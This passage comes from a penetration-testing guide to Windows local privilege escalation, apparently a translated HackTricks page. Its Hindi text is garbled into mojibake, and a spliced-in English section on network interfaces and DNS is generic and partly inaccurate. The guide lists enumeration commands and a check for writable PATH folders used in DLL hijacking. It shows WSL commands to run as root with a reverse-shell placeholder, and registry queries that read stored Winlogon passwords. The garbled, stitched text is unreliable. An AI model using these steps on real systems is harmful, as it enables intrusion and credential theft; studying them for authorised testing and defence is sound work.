**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рдРрд╕реЗ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рдЕрдзрд┐рдХрд╛рд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**\
**рдЗрдВрдЯрд░реЗрд╕реНрдЯрд┐рдВрдЧ рдСрдЯреЛрд░рдиреНрд╕ рд╕реНрдерд╛рдиреЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **рдкреГрд╖реНрда** рдХреЛ **рдкрдврд╝реЗрдВ**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### рдбреНрд░рд╛рдЗрд╡рд░реНрд╕

**рд╕рдВрднрд╛рд╡рд┐рдд** рддреГрддреАрдп рдкрдХреНрд╖ **рдЕрдЬреАрдм/рдЬреЛрдЦрд┐рдо рднрд░реЗ** рдбреНрд░рд╛рдЗрд╡рд░реНрд╕ рдвреВрдВрдвреЗрдВ
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ PATH рдкрд░ рдореМрдЬреВрдж рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк DLL рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдХреЗ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ DLL рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЙрдЪреНрдЪрддрдо рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

PATH рдореЗрдВ рд╕рднреА рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
рдЗрд╕ рдЪреЗрдХ рдХреЛ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджреЗрдЦреЗрдВ:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## рдиреЗрдЯрд╡рд░реНрдХ

### рд╢реЗрдпрд░реНрд╕
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### рд╣реЛрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓

рд╣реЛрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдкрд░ рд╣рд╛рд░реНрдбрдХреЛрдб рдХрд┐рдП рдЧрдП рдЕрдиреНрдп рдЬреНрдЮрд╛рдд рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```
type C:\Windows\System32\drivers\etc\hosts
```
### рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдФрд░ DNS

In this section, we will discuss network interfaces and DNS settings that can be exploited for privilege escalation.

#### Network Interfaces

Network interfaces are the connections between a computer and a network. These interfaces can be physical (such as Ethernet or Wi-Fi) or virtual (such as VPN or virtual machines). Exploiting network interfaces can provide an attacker with additional privileges.

##### Network Interface Enumeration

To enumerate network interfaces on a Windows system, you can use the following commands:

```bash
ipconfig /all
```

This command will display detailed information about all network interfaces, including their IP addresses, MAC addresses, and DNS settings.

##### Network Interface Misconfigurations

Misconfigurations in network interfaces can lead to privilege escalation. Some common misconfigurations include:

- **Promiscuous Mode**: Enabling promiscuous mode on a network interface allows it to capture all network traffic, including traffic that is not intended for the interface. This can be exploited by an attacker to intercept sensitive information.

- **Weak Passwords**: Weak passwords on network interfaces can be easily cracked, allowing an attacker to gain unauthorized access.

- **Unpatched Vulnerabilities**: Network interfaces may have unpatched vulnerabilities that can be exploited by an attacker to gain elevated privileges.

#### DNS Settings

DNS (Domain Name System) is responsible for translating domain names into IP addresses. Exploiting DNS settings can allow an attacker to redirect network traffic and gain unauthorized access.

##### DNS Cache Poisoning

DNS cache poisoning is a technique where an attacker injects malicious DNS records into a DNS cache. This can be used to redirect network traffic to a malicious server controlled by the attacker.

##### DNS Spoofing

DNS spoofing is a technique where an attacker intercepts DNS requests and responds with false information. This can be used to redirect network traffic to a malicious server controlled by the attacker.

##### DNS Hijacking

DNS hijacking is a technique where an attacker gains control over a DNS server and redirects DNS requests to a malicious server controlled by the attacker.

##### DNS Misconfigurations

Misconfigurations in DNS settings can lead to privilege escalation. Some common misconfigurations include:

- **Open DNS Resolvers**: Open DNS resolvers allow anyone to use them for DNS queries. This can be exploited by an attacker to launch DNS amplification attacks or perform DNS cache poisoning.

- **Weak DNS Zone Transfers**: Weak DNS zone transfer settings can allow an attacker to obtain a copy of the DNS zone file, which may contain sensitive information.

- **Unpatched DNS Software**: DNS software may have unpatched vulnerabilities that can be exploited by an attacker to gain elevated privileges.

#### Conclusion

Network interfaces and DNS settings can be exploited for privilege escalation. It is important to properly configure and secure these components to prevent unauthorized access and maintain the security of a system.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕

рдмрд╛рд╣рд░ рд╕реЗ **рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛рдУрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
netstat -ano #Opened ports?
```
### рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓

рдПрдХ рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓ рдПрдХ рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬреЛ рдиреЗрдЯрд╡рд░реНрдХ рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдЙрдирдХреЗ рд▓рдХреНрд╖реНрдп рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддреА рд╣реИред рдпрд╣ рдЯреЗрдмрд▓ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕реЛрдВ, рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЛрдВ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЧреЗрдЯрд╡реЗ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓ рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЗ, рдиреЗрдЯрд╡рд░реНрдХ рдорд╛рд╕реНрдХ, рдиреЗрдХреНрд╕реНрдЯ рд╣реЙрдк рдФрд░ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдмреАрдЪ рдХрдиреЗрдХреНрд╢рди рдХреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред рдпрд╣ рдЯреЗрдмрд▓ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рд╕рд╣реА рд░рд╛рдЙрдЯ рдкрд░ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред

рдПрдХ рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓ рдореЗрдВ рдПрдВрдЯреНрд░реА рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЧреЗрдЯрд╡реЗ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рдЖрддрд╛ рд╣реИ, рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓ рдЙрд╕реЗ рдЙрдЪрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЧреЗрдЯрд╡реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдЙрдЪрд┐рдд рд▓рдХреНрд╖реНрдп рдиреЗрдЯрд╡рд░реНрдХ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗред

рдПрдХ рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдЬреИрд╕реЗ рдХрд┐ RIP (Routing Information Protocol), OSPF (Open Shortest Path First), рдФрд░ BGP (Border Gateway Protocol) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдорд╛рд░реНрдЧ рдЪреБрдирдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдиреЗрдЯрд╡рд░реНрдХ рдЯреЛрдкреЛрд▓реЙрдЬреА рдореЗрдВ рдХреЛрдИ рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрддрд╛ рд╣реИред
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP рддрд╛рд▓рд┐рдХрд╛

ARP рддрд╛рд▓рд┐рдХрд╛ рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЗ рдФрд░ рдЙрд╕рдХреЗ рдореЗрдХ-рдПрдбреНрд░реЗрд╕ (MAC) рдкрддреЗ рдХреЗ рдмреАрдЪ рдореИрдкрд┐рдВрдЧ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпрд╣ рдПрдХ рдбрд╛рдпрдирд╛рдорд┐рдХ рддрд╛рд▓рд┐рдХрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЕрджреНрдпрддрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред ARP рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ, рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЗ рдФрд░ MAC рдкрддреЗ рдХреЗ рдмреАрдЪ рдХреА рдореИрдкрд┐рдВрдЧ рдПрдВрдЯреНрд░реАрдЬрд╝ рд╣реЛрддреА рд╣реИрдВред

ARP рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯ рдХреЛ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░реЗрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдПрдХ рдЕрдиреНрдп рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ ARP рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдЙрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЗ рдХреЗ рд▓рд┐рдП MAC рдкрддрд╛ рдЦреЛрдЬрддрд╛ рд╣реИред рдпрджрд┐ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдВрдЯреНрд░реА рдореМрдЬреВрдж рд╣реИ, рддреЛ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдЙрд╕ MAC рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯ рдХреЛ рдкреНрд░реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдВрдЯреНрд░реА рдирд╣реАрдВ рд╣реИ, рддреЛ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдПрдХ ARP рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреЗрдЬрдХрд░ рдЙрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрддреЗ рдХреЗ рд▓рд┐рдП MAC рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ред рдЬрдм рдпрд╣ рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдирдИ рдореИрдкрд┐рдВрдЧ рдПрдВрдЯреНрд░реА рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯ рдкреНрд░реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

ARP рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдПрдХ рд╣реИрдХрд░ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рдмреАрдЪ рдХреА рд╕рдВрдЪрд╛рд░ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдпрд╛ рдЕрдиреБрд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рд╣реИрдХрд░ ARP рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рджреЗрдЦрдХрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛рдУрдВ рдХреЛ рдЕрдзрд┐рдХ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдзрд┐рдХ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдирд┐рдпрдо

[**рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕рдВрдмрдВрдзрд┐рдд рдХрдорд╛рдВрдбреНрд╕ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЗрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](../basic-cmd-for-pentesters.md#firewall) **(рдирд┐рдпрдо рд╕реВрдЪреА, рдирд┐рдпрдо рдмрдирд╛рдПрдВ, рдмрдВрдж рдХрд░реЗрдВ, рдмрдВрдж рдХрд░реЗрдВ...)**

рдФрд░ [рдпрд╣рд╛рдВ рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдбреНрд╕](../basic-cmd-for-pentesters.md#network) рд╣реИрдВред

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
рдмрд╛рдЗрдирд░реА `bash.exe` рдХреЛ `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` рдореЗрдВ рднреА рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрди рд╕рдХрддреЗ рд╣реИрдВ (рдкрд╣рд▓реА рдмрд╛рд░ рдЬрдм рдЖрдк `nc.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВрдЧреЗ, рддреЛ рдпрд╣ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рджреНрд╡рд╛рд░рд╛ `nc` рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП GUI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрдЫреЗрдЧрд╛)ред
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
рдЖрд╕рд╛рдиреА рд╕реЗ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдмреИрд╢ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `--default-user root` рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк `WSL` рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝реЛрд▓реНрдбрд░ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## Windows рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

### Winlogon рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рдмрдВрдзрдХ / рд╡рд┐рдВрдбреЛрдЬ рд╡реЙрд▓реНрдЯ

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault) рд╕реЗ\
рд╡рд┐рдВрдбреЛрдЬ рд╡реЙрд▓реНрдЯ рд╡рд┐рдВрдбреЛрдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░, рд╡реЗрдмрд╕рд╛рдЗрдЯ рдФрд░ рдЕрдиреНрдп рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ **рд╡рд┐рдВрдбреЛрдЬ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓реА рдирдЬрд░ рдореЗрдВ, рдРрд╕рд╛ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЕрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ рдлреЗрд╕рдмреБрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░, рдЯреНрд╡рд┐рдЯрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░, рдЬреАрдореЗрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЖрджрд┐ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рд╡реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдЗрди рд╣реЛрдВред рд▓реЗрдХрд┐рди рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИред

рд╡рд┐рдВрдбреЛрдЬ рд╡реЙрд▓реНрдЯ рдЙрди рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рд┐рдВрдбреЛрдЬ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА **рд╡рд┐рдВрдбреЛрдЬ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ рдХрд┐рд╕реА рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** (рд╕рд░реНрд╡рд░ рдпрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ) **рдЗрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рдмрдВрдзрдХ** рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рд╡реЙрд▓реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдмрд╛рд░-рдмрд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рдмрдВрдзрдХ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рджрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рддреЛ, рдпрджрд┐ рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡реЙрд▓реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рдмрдВрдзрдХ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрдЧреНрд░рд╣реАрдд рд╡реЙрд▓реНрдЯ рд╕реЗ рдЙрд╕ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред

рдорд╢реАрди рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА рдХреЗ рд▓рд┐рдП `cmdkey` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
